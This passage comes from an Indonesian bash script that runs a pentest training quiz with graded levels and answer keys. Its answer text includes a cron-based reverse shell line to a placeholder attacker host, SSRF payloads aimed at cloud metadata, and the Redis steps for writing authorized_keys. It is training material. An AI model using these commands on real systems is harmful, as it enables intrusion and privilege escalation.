    echo -e "  ${WHITE}Pertanyaan 1:${RESET}"
    echo "  Dari informasi di atas, apa yang paling menarik untuk diselidiki?"
    echo ""
    echo "  a) Header Server: Apache"
    echo "  b) Direktori /backup/ yang di-disallow di robots.txt"
    echo "  c) Halaman /admin/login.php"
    echo "  d) Jawaban b dan c keduanya penting"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "d" ]]; then
        benar "/backup/ mungkin berisi file sensitif. /admin/ adalah target utama."
        ((sc++))
    else
        salah "Jawaban: d) Keduanya. /backup/ sering isi db dump, /admin/ target auth bypass."
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 2:${RESET}"
    echo "  PHP versi 7.2.24 sudah End of Life sejak November 2020."
    echo "  Apa implikasinya dari sisi security?"
    echo ""
    echo -ne "  Jelaskan (jawab bebas, minimum 1 kalimat): "
    read -r j
    if echo "${j,,}" | grep -qE "patch|update|cve|exploit|vulnerability|tidak.*update|celah"; then
        benar "Benar. Versi EOL tidak dapat security patch, rentan terhadap known CVE."
        ((sc++))
    else
        salah "PHP EOL = tidak ada security update. Semua CVE baru tidak di-patch."
        peringatan "Selalu catat versi software dan cek CVE yang relevan."
    fi
    jeda

    clear
    header_level "$CT_LVL_ADV - $CT_LEVEL 5" "Fase 2: Exploitation Analysis" "$RED"

    echo "  Kamu berhasil akses /backup/ dan menemukan file backup.sql"
    echo "  Di dalamnya ada tabel users dengan kolom: id, username, password, role"
    echo ""
    echo "  Contoh data:"
    echo "  1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 | admin"
    echo "  2 | john  | e10adc3949ba59abbe56e057f20f883e | user"
    echo ""

    echo -e "  ${WHITE}Pertanyaan 3:${RESET}"
    echo "  Hash 5f4dcc3b5aa765d61d8327deb882cf99 memiliki panjang 32 karakter."
    echo "  Ini adalah hash dari algoritma apa?"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if echo "${j,,}" | grep -q "md5"; then
        benar "MD5 menghasilkan hash 32 karakter hexadecimal. Hash ini sudah BROKEN."
        ((sc++))
    else
        salah "Jawaban: MD5 (32 karakter hex)."
    fi
    echo ""

    if command -v python3 &>/dev/null; then
        python3 << 'PYEOF'
import hashlib

hashes = {
    "5f4dcc3b5aa765d61d8327deb882cf99": "password",
    "e10adc3949ba59abbe56e057f20f883e": "123456"
}

print("  [SIMULASI CRACKING]")
print()
wordlist = ["password", "123456", "admin", "qwerty", "letmein", "monkey"]
for h, known in hashes.items():
    for word in wordlist:
        if hashlib.md5(word.encode()).hexdigest() == h:
            print(f"  Hash : {h}")
            print(f"  Crack: {word}")
            print()
            break
PYEOF
    fi

    echo -e "  ${WHITE}Pertanyaan 4:${RESET}"
    echo "  Setelah crack hash dan dapat password admin, kamu login ke /admin/"
    echo "  Kamu menemukan fitur 'Import data from URL'."
    echo "  Vulnerability apa yang kemungkinan ada di fitur ini?"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if echo "${j,,}" | grep -qE "ssrf|server.*side|request.*forgery"; then
        benar "SSRF! Fitur fetch URL bisa dieksploitasi untuk akses resource internal."
        ((sc++))
    else
        salah "Jawaban: SSRF (Server-Side Request Forgery)."
        info "Coba payload: http://127.0.0.1/admin atau http://169.254.169.254/latest/"
    fi
    jeda

    clear
    header_level "$CT_LVL_ADV - $CT_LEVEL 5" "Fase 3: Reporting" "$RED"

    echo -e "  ${WHITE}Pertanyaan 5:${RESET}"
    echo "  Semua temuan harus diberi rating severity menggunakan CVSS."
    echo "  Password tersimpan dengan MD5 tanpa salt mendapat CVSS berapa?"
    echo ""
    echo "  a) Low (0-3.9)"
    echo "  b) Medium (4-6.9)"
    echo "  c) High (7-8.9)"
    echo "  d) Critical (9-10)"
    echo ""
    echo -ne "  Jawab (pendapatmu): "
    read -r j
    if [[ "${j,,}" == "c" || "${j,,}" == "b" ]]; then
        benar "Umumnya dinilai High. MD5 = mudah crack + tidak ada salt = data bocor."
        ((sc++))
    elif [[ "${j,,}" == "d" ]]; then
        benar "Bisa juga Critical jika password admin terlibat. Penilaian tergantung konteks."
        ((sc++))
    else
        salah "Seharusnya minimal High. MD5 tanpa salt = password bisa di-crack cepat."
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 6:${RESET}"
    echo "  Urutan yang benar untuk menulis laporan pentest adalah?"
    echo ""
    echo "  a) Executive Summary -> Findings -> Methodology -> Remediation"
    echo "  b) Executive Summary -> Methodology -> Findings -> Remediation"
    echo "  c) Findings -> Executive Summary -> Remediation -> Methodology"
    echo "  d) Methodology -> Findings -> Executive Summary -> Remediation"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "Struktur standar: Summary -> Methodology -> Findings -> Remediation."
        ((sc++))
    else
        salah "Jawaban: b) Executive Summary -> Methodology -> Findings -> Remediation."
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 7 - Final:${RESET}"
    echo "  Kamu menemukan critical vulnerability di aplikasi client."
    echo "  Langkah etis yang benar adalah?"
    echo ""
    echo "  a) Publish di social media untuk dapat reputasi"
    echo "  b) Exploit sebanyak mungkin untuk bukti impact"
    echo "  c) Segera laporkan ke client, berikan PoC minimal, tunggu patch"
    echo "  d) Diamkan karena bukan tanggung jawabmu"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "c" ]]; then
        benar "Responsible disclosure: lapor ke vendor/client, beri waktu patch, baru publish."
        ((sc++))
    else
        salah "Jawaban: c) Responsible disclosure. Publish tanpa izin = ilegal."
    fi

    echo ""
    status=$(tampil_skor $sc $tot | tail -1)
    simpan_hasil "$CT_LVL_ADV" "Latihan-5" $sc $tot "$status"
    [ "$status" == "$CT_PASSED" ] && tandai_selesai "A1"
    jeda
}


latihan_advanced_2() {
    header_level "$CT_LVL_ADV - $CT_LEVEL 6" "Network Attack Simulation" "$RED"
    echo "  Skenario: Kamu adalah network security analyst."
    echo "  Kamu menerima alert bahwa ada aktivitas mencurigakan di jaringan internal."
    echo "  Tugas: investigasi, identifikasi serangan, dan tentukan mitigasi."
    jeda

    sc=0; tot=6

    clear
    header_level "$CT_LVL_ADV - $CT_LEVEL 6" "Analisis Traffic & ARP" "$RED"

    echo "  Berikut adalah cuplikan log ARP dari switch:"
    echo ""
    echo -e "${DIM}"
    echo "  [10:15:01] ARP Reply: 192.168.1.1 is at AA:BB:CC:DD:EE:FF"
    echo "  [10:15:01] ARP Reply: 192.168.1.1 is at 11:22:33:44:55:66"
    echo "  [10:15:02] ARP Reply: 192.168.1.1 is at 11:22:33:44:55:66"
    echo "  [10:15:02] ARP Reply: 192.168.1.100 is at 11:22:33:44:55:66"
    echo "  [10:15:03] ARP Reply: 192.168.1.100 is at FF:EE:DD:CC:BB:AA"
    echo -e "${RESET}"
    echo ""

    echo -e "  ${WHITE}Pertanyaan 1:${RESET}"
    echo "  Dari log ARP di atas, serangan apa yang sedang terjadi?"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if echo "${j,,}" | grep -qE "arp.*spoof|arp.*poison|man.in.the.middle|mitm"; then
        benar "ARP Spoofing / ARP Poisoning! Satu IP dipetakan ke beberapa MAC."
        ((sc++))
    else
        salah "Jawaban: ARP Spoofing (ARP Poisoning). Dua MAC berbeda klaim satu IP."
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 2:${RESET}"
    echo "  Tujuan attacker melakukan ARP Spoofing adalah?"
    echo ""
    echo "  a) Membuat jaringan lebih cepat"
    echo "  b) Memposisikan diri sebagai Man-in-the-Middle untuk intercept traffic"
    echo "  c) Menambah bandwidth"
    echo "  d) Mengunci akun user"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "MitM = attacker di tengah, bisa baca, modifikasi, atau drop traffic."
        ((sc++))
    else
        salah "Jawaban: b) Man-in-the-Middle positioning."
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 3:${RESET}"
    echo "  Mitigasi paling efektif terhadap ARP Spoofing di lingkungan enterprise?"
    echo ""
    echo "  a) Ganti semua kabel jaringan"
    echo "  b) Dynamic ARP Inspection (DAI) di managed switch"
    echo "  c) Restart semua komputer"
    echo "  d) Blokir semua traffic ARP"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "DAI memvalidasi ARP packet terhadap DHCP snooping binding table."
        ((sc++))
    else
        salah "Jawaban: b) Dynamic ARP Inspection di managed switch."
    fi
    jeda

    clear
    header_level "$CT_LVL_ADV - $CT_LEVEL 6" "Analisis Port Scan & Intrusion" "$RED"

    echo "  Log IDS (Intrusion Detection System) menampilkan:"
    echo ""
    echo -e "${DIM}"
    echo "  [10:20:15] ALERT: Port scan detected from 192.168.1.200"
    echo "  [10:20:15] SYN packet to 192.168.1.50:22 - no ACK returned"
    echo "  [10:20:15] SYN packet to 192.168.1.50:80 - no ACK returned"
    echo "  [10:20:15] SYN packet to 192.168.1.50:443 - no ACK returned"
    echo "  [10:20:16] SYN packet to 192.168.1.50:3306 - SYN-ACK received"
    echo "  [10:20:16] RST sent to 192.168.1.50:3306"
    echo "  [10:20:20] ALERT: Multiple failed SSH logins from 192.168.1.200"
    echo -e "${RESET}"
    echo ""

    echo -e "  ${WHITE}Pertanyaan 4:${RESET}"
    echo "  Dari pattern log di atas, attacker menggunakan jenis scan nmap apa?"
    echo ""
    echo "  a) TCP Connect Scan (-sT)"
    echo "  b) SYN Stealth Scan (-sS)"
    echo "  c) UDP Scan (-sU)"
    echo "  d) Ping Scan (-sn)"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "SYN Scan: kirim SYN, kalau dapat SYN-ACK kirim RST. Tidak complete handshake."
        ((sc++))
    else
        salah "Jawaban: b) SYN Stealth Scan. Terlihat dari pola SYN -> RST tanpa ACK."
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 5:${RESET}"
    echo "  Port 3306 (MySQL) terdeteksi OPEN dan accessible dari jaringan internal."
    echo "  Ini adalah misconfiguration serius. Kenapa?"
    echo ""
    echo -ne "  Jelaskan (jawab bebas): "
    read -r j
    if echo "${j,,}" | grep -qE "database|data|langsung|akses|internet|expose|batas|firewall"; then
        benar "Database tidak boleh langsung accessible. Harus di belakang aplikasi."
        ((sc++))
    else
        salah "Database server seharusnya tidak bisa diakses langsung. Bind ke 127.0.0.1 atau pakai firewall."
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 6:${RESET}"
    echo "  Setelah investigasi, kamu ingin blokir IP 192.168.1.200 di Linux firewall."
    echo "  Perintah iptables yang benar adalah?"
    echo ""
    echo "  a) iptables -A INPUT -s 192.168.1.200 -j DROP"
    echo "  b) iptables -D INPUT -s 192.168.1.200 -j ACCEPT"
    echo "  c) iptables -F INPUT"
    echo "  d) iptables -P INPUT DROP"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "a" ]]; then
        benar "-A INPUT menambah rule, -s source IP, -j DROP = buang semua packet dari IP itu."
        ((sc++))
    else
        salah "Jawaban: a) iptables -A INPUT -s 192.168.1.200 -j DROP"
    fi

    echo ""
    status=$(tampil_skor $sc $tot | tail -1)
    simpan_hasil "$CT_LVL_ADV" "Latihan-6" $sc $tot "$status"
    [ "$status" == "$CT_PASSED" ] && tandai_selesai "A2"
    jeda
}


latihan_expert() {
    header_level "$CT_LVL_EXP - $CT_LEVEL 7" "Red Team Scenario: Full Chain Attack" "$MAGENTA"
    echo "  Level tertinggi. Kamu menghadapi skenario full attack chain."
    echo "  Dari reconnaissance sampai post-exploitation."
    echo "  Tidak ada petunjuk. Kamu harus tentukan langkah sendiri."
    echo ""
    echo -e "  ${MAGENTA}  Hanya untuk yang sudah menyelesaikan semua level sebelumnya.${RESET}"
    jeda

    sc=0; tot=8

    clear
    header_level "$CT_LVL_EXP - $CT_LEVEL 7" "Tahap 1: Initial Recon" "$MAGENTA"

    echo "  TARGET BRIEF:"
    echo "  Perusahaan: PT. Contoh Digital (fiktif)"
    echo "  Domain: contoh-digital.id"
    echo "  Scope: Semua aset publik yang terdaftar"
    echo ""
    echo "  Kamu mulai dengan passive reconnaissance."
    echo ""

    echo -e "  ${WHITE}Situasi 1:${RESET}"
    echo "  Dari WHOIS kamu dapat: ns1.contoh-digital.id, ns2.contoh-digital.id"
    echo "  Dari crt.sh kamu dapat subdomain: mail, dev, api, staging, admin"
    echo "  Dari LinkedIn kamu tahu mereka pakai: Nginx, Laravel, Ubuntu 20.04"
    echo ""
    echo "  Target mana yang prioritas untuk diselidiki?"
    echo ""
    echo "  a) mail.contoh-digital.id"
    echo "  b) www.contoh-digital.id"
    echo "  c) dev.contoh-digital.id dan staging.contoh-digital.id"
    echo "  d) api.contoh-digital.id"
    echo ""
    echo -ne "  Jawab (boleh lebih dari satu, pisah koma): "
    read -r j
    if echo "${j,,}" | grep -qE "c|dev|staging"; then
        benar "dev dan staging sering tidak terlindungi sebaik production."
        benar "api juga menarik karena sering punya kerentanan autentikasi."
        ((sc++))
    else
        salah "dev/staging adalah goldmine. Sering pakai debug mode, credential lemah."
    fi
    echo ""

    echo -e "  ${WHITE}Situasi 2:${RESET}"
    echo "  Scan Shodan untuk IP utama menampilkan:"
    echo "  Port 22 (OpenSSH 7.6), Port 80 (Nginx), Port 443 (Nginx)"
    echo "  Port 8080 (Apache Tomcat 8.5.32), Port 6379 (Redis)"
    echo ""
    echo "  Temuan mana yang PALING KRITIS?"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if echo "${j,,}" | grep -qE "redis|6379"; then
        benar "Redis 6379 tanpa autentikasi = RCE potential via SSRF atau langsung akses!"
        benar "Tomcat 8.5.32 juga tua, ada CVE yang tersedia."
        ((sc++))
    elif echo "${j,,}" | grep -qE "tomcat|8080|8.5"; then
        benar "Tomcat 8.5.32 memang kritis! Redis juga harus dicek autentikasinya."
        ((sc++))
    else
        salah "Redis tanpa auth di port 6379 = bisa tulis file arbitrary, potensi RCE."
    fi
    jeda

    clear
    header_level "$CT_LVL_EXP - $CT_LEVEL 7" "Tahap 2: Exploitation Chain" "$MAGENTA"

    echo "  Kamu berhasil akses dev.contoh-digital.id"
    echo "  Ditemukan: Laravel debug mode AKTIF, error verbose"
    echo "  Ditemukan: /.env accessible (berisi DB_PASSWORD dan APP_KEY)"
    echo ""
    echo "  APP_KEY: base64:tVhDxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx="
    echo "  DB_HOST: 127.0.0.1"
    echo "  DB_NAME: contoh_prod"
    echo "  DB_USER: root"
    echo "  DB_PASS: Sup3rS3cr3t2024!"
    echo ""

    echo -e "  ${WHITE}Situasi 3:${RESET}"
    echo "  APP_KEY Laravel bocor. Konsekuensinya apa?"
    echo ""
    echo "  a) Attacker bisa decrypt session cookie dan forge cookie admin"
    echo "  b) Tidak berbahaya, hanya key enkripsi database"
    echo "  c) Hanya bisa baca konfigurasi"
    echo "  d) Tidak ada dampak langsung"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "a" ]]; then
        benar "APP_KEY bocor = bisa forge signed cookie = account takeover SEMUA user."
        benar "CVE terkait: Laravel unserialize via cookie -> RCE di versi lama."
        ((sc++))
    else
        salah "Jawaban: a) APP_KEY adalah kunci enkripsi session. Bocor = forge session."
    fi
    echo ""

    echo -e "  ${WHITE}Situasi 4:${RESET}"
    echo "  DB menggunakan user 'root'. Implikasi terbesar dari sisi security?"
    echo ""
    echo -ne "  Jawab bebas: "
    read -r j
    if echo "${j,,}" | grep -qE "root|privilege|semua|all|drop|delete|tabel|database|akses"; then
        benar "DB root bisa akses semua database, drop tabel, baca semua data."
        benar "Prinsip Least Privilege: buat user DB khusus dengan hak minimal."
        ((sc++))
    else
        salah "DB root = hak penuh ke semua database di server itu. Sangat berbahaya."
    fi
    jeda

    clear
    header_level "$CT_LVL_EXP - $CT_LEVEL 7" "Tahap 3: Post-Exploitation & Lateral Movement" "$MAGENTA"

    echo -e "  ${WHITE}Situasi 5:${RESET}"
    echo "  Kamu dapat reverse shell sebagai www-data di server."
    echo "  Cek /etc/passwd menunjukkan ada user: www-data, ubuntu, deploy, mysql"
    echo "  Cek crontab -l (sebagai www-data) menampilkan:"
    echo ""
    echo -e "  ${DIM}  */5 * * * * /var/www/html/scripts/cleanup.sh${RESET}"
    echo ""
    echo "  File cleanup.sh dimiliki www-data dan writable."
    echo "  Bagaimana cara eskalasi privilege menggunakan ini?"
    echo ""
    echo -ne "  Jawab (jelaskan tekniknya): "
    read -r j
    if echo "${j,,}" | grep -qE "tulis|edit|tambah|inject|bash|shell|cron|reverse|command"; then
        benar "Modifikasi cleanup.sh tambahkan reverse shell -> tunggu cron jalan -> dapat shell."
        benar "echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> cleanup.sh"
        ((sc++))
    else
        salah "Tambahkan command ke cleanup.sh. Cron akan jalankannya -> shell dengan hak lebih tinggi."
    fi
    echo ""

    echo -e "  ${WHITE}Situasi 6:${RESET}"
    echo "  Kamu berhasil pivot ke server internal via /etc/hosts:"
    echo "  192.168.10.5 internal-db.contoh-digital.id"
    echo ""
    echo "  Dari server ini kamu bisa akses Redis di 192.168.10.5:6379."
    echo "  Redis tidak punya autentikasi. Perintah Redis apa yang bisa"
    echo "  digunakan untuk menulis SSH key kamu ke /root/.ssh/authorized_keys?"
    echo ""
    echo "  a) Redis SET key value"
    echo "  b) CONFIG SET dir /root/.ssh lalu CONFIG SET dbfilename authorized_keys lalu SET x [key] lalu SAVE"
    echo "  c) HSET authorized_keys value"
    echo "  d) DUMP authorized_keys"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "Teknik klasik Redis RCE via arbitrary file write ke authorized_keys."
        ((sc++))
    else
        salah "Jawaban: b) CONFIG SET dir + dbfilename + SET + SAVE = tulis file sembarang."
    fi
    jeda

    clear
    header_level "$CT_LVL_EXP - $CT_LEVEL 7" "Tahap 4: Dokumentasi & Responsible Disclosure" "$MAGENTA"

    echo -e "  ${WHITE}Situasi 7:${RESET}"
    echo "  Kamu menemukan 12 vulnerability: 2 Critical, 3 High, 5 Medium, 2 Low."
    echo "  Client minta prioritas perbaikan karena resource terbatas."
    echo "  Urutan yang benar adalah?"
    echo ""
    echo "  a) Low -> Medium -> High -> Critical (dari mudah ke sulit)"
    echo "  b) Critical -> High -> Medium -> Low (dari impact tertinggi)"
    echo "  c) Random, semua penting"
    echo "  d) Hanya yang Critical saja"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "Risk-based prioritization: perbaiki yang paling berbahaya dulu."
        ((sc++))
    else
        salah "Jawaban: b) Critical dulu, karena eksploitasi bisa terjadi kapanpun."
    fi
    echo ""

    echo -e "  ${WHITE}Situasi 8 - Final:${RESET}"
    echo "  Setelah pentest selesai, data sensitif apa yang HARUS kamu hapus?"
    echo ""
    echo "  a) Tidak perlu hapus apa-apa, simpan untuk referensi"
    echo "  b) Semua tool dan script yang diupload, credential yang ditemukan,"
    echo "     persistence mechanism yang dibuat selama testing"
    echo "  c) Hanya screenshot saja"
    echo "  d) Hanya log aktivitas"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "WAJIB cleanup: hapus semua artefak testing, tutup semua backdoor."
        benar "Ini adalah standar etika dan profesionalisme pentester."
        ((sc++))
    else
        salah "Jawaban: b) Semua artefak harus dibersihkan. Ini kewajiban etis pentester."
    fi

    echo ""
    status=$(tampil_skor $sc $tot | tail -1)
    simpan_hasil "$CT_LVL_EXP" "Latihan-7" $sc $tot "$status"
    [ "$status" == "$CT_PASSED" ] && tandai_selesai "E1"

    echo ""
    echo -e "${MAGENTA}  ================================================================${RESET}"
    echo -e "  Kamu telah menyelesaikan level EXPERT."
    echo -e "  Ini adalah level tertinggi di CyberTuz Training Arena."
    echo ""
    echo -e "  Langkah selanjutnya di dunia nyata:"
    echo "  - Latihan di HackTheBox / TryHackMe / VulnHub"
    echo "  - Ikuti Bug Bounty program (HackerOne, Bugcrowd)"
    echo "  - Ambil sertifikasi: CEH, OSCP, PNPT"
    echo "  - Bergabung komunitas: id-sirtii.or.id, cybersecurity.id"
    echo -e "${MAGENTA}  ================================================================${RESET}"
    jeda
}


tampil_progress() {
    clear
    echo -e "${CYAN}"
    echo "  ╔══════════════════════════════════════════════════════════════╗"
    echo "  ║               $CT_ARENA_HDR - $CT_PROGRESS                 ║"
    echo "  ╚══════════════════════════════════════════════════════════════╝"
    echo -e "${RESET}"
    echo ""

    cek() {
        sudah_selesai "$1" && echo -e "  ${GREEN}[LULUS]${RESET}" || echo -e "  ${RED}[BELUM]${RESET}"
    }

    echo -e "${GREEN}  NEWBIE (Level 1-2)${RESET}"
    printf "  %-45s %s\n" "Level 1: Mengenal Jaringan & Port" "$(cek N1)"
    printf "  %-45s %s\n" "Level 2: Reconnaissance & OSINT Dasar" "$(cek N2)"
    echo ""
    echo -e "${GREEN}  INTERMEDIATE (Level 3-4)${RESET}"
    printf "  %-45s %s\n" "Level 3: Web Application Vulnerability" "$(cek I1)"
    printf "  %-45s %s\n" "Level 4: Linux Security & PrivEsc" "$(cek I2)"
    echo ""
    echo -e "${GREEN}  ADVANCED (Level 5-6)${RESET}"
    printf "  %-45s %s\n" "Level 5: Full Pentest Scenario - Web App" "$(cek A1)"
    printf "  %-45s %s\n" "Level 6: Network Attack Simulation" "$(cek A2)"
    echo ""
    echo -e "${GREEN}  EXPERT (Level 7)${RESET}"
    printf "  %-45s %s\n" "Level 7: Red Team Full Chain Attack" "$(cek E1)"
    echo ""

    if [ -f "$LATIHAN_SCORE" ]; then
        echo -e "${CYAN}  ----------------------------------------------------------------${RESET}"
        echo "  Riwayat sesi terakhir:"
        echo ""
        tail -5 "$LATIHAN_SCORE" | while IFS='|' read -r ts lv sesi sc tot status; do
            printf "  %-12s %-12s %-10s %s\n" "$lv" "$sesi" "$sc/$tot" "$status"
        done
    fi
    jeda
}


latihan_menu() {
    while true; do
        clear
        echo -e "${CYAN}"
        echo "  ╔══════════════════════════════════════════════════════════════╗"
        echo "  ║                   $CT_ARENA_HDR                  ║"
        echo "  ╠══════════════════════════════════════════════════════════════╣"
        echo "  ║  Latihan berjenjang dari Newbie sampai Expert.               ║"
        echo "  ║  Setiap level mensimulasikan skenario pentest nyata.         ║"
        echo "  ╚══════════════════════════════════════════════════════════════╝"
        echo -e "${RESET}"
        echo ""
        echo -e "${GREEN}  -- NEWBIE --${RESET}"
        sudah_selesai "N1" && tag="${GREEN}[LULUS]${RESET}" || tag="${DIM}[BELUM]${RESET}"
        echo -e "  ${GREEN}[1]${RESET} Level 1 : Mengenal Jaringan & Port              $tag"
        sudah_selesai "N2" && tag="${GREEN}[LULUS]${RESET}" || tag="${DIM}[BELUM]${RESET}"
        echo -e "  ${GREEN}[2]${RESET} Level 2 : Reconnaissance & OSINT Dasar          $tag"
        echo ""
        echo -e "${GREEN}  -- INTERMEDIATE --${RESET}"
        sudah_selesai "I1" && tag="${GREEN}[LULUS]${RESET}" || tag="${DIM}[BELUM]${RESET}"
        echo -e "  ${GREEN}[3]${RESET} Level 3 : Web Application Vulnerability         $tag"
        sudah_selesai "I2" && tag="${GREEN}[LULUS]${RESET}" || tag="${DIM}[BELUM]${RESET}"
        echo -e "  ${GREEN}[4]${RESET} Level 4 : Linux Security & Privilege Escalation $tag"
        echo ""
        echo -e "${GREEN}  -- ADVANCED --${RESET}"
        sudah_selesai "A1" && tag="${GREEN}[LULUS]${RESET}" || tag="${DIM}[BELUM]${RESET}"
        echo -e "  ${GREEN}[5]${RESET} Level 5 : Full Pentest Scenario - Web App       $tag"
        sudah_selesai "A2" && tag="${GREEN}[LULUS]${RESET}" || tag="${DIM}[BELUM]${RESET}"
        echo -e "  ${GREEN}[6]${RESET} Level 6 : Network Attack Simulation             $tag"
        echo ""
        echo -e "${GREEN}  -- EXPERT --${RESET}"
        sudah_selesai "E1" && tag="${GREEN}[LULUS]${RESET}" || tag="${DIM}[BELUM]${RESET}"
        echo -e "  ${GREEN}[7]${RESET} Level 7 : Red Team Full Chain Attack            $tag"
        echo ""
        echo -e "  ${GREEN}[8] Lihat Progress & Riwayat Skor${RESET}"
        echo -e "  ${WHITE}[0]${RED} Kembali ke Menu Utama${RESET}"
        echo ""
        echo -e "${CYAN}  ----------------------------------------------------------------${RESET}"
        echo -ne "  Pilih level [0-8]: "
        read -r p
        case "$p" in
            1) latihan_newbie_1 ;;
            2) latihan_newbie_2 ;;
            3) latihan_intermediate_1 ;;
            4) latihan_intermediate_2 ;;
            5) latihan_advanced_1 ;;
            6) latihan_advanced_2 ;;
            7) latihan_expert ;;
            8) tampil_progress ;;
            0) break ;;
            *) echo -e "${RED}  Pilihan tidak valid.${RESET}"; sleep 1 ;;
        esac
    done
}

latihan_menu
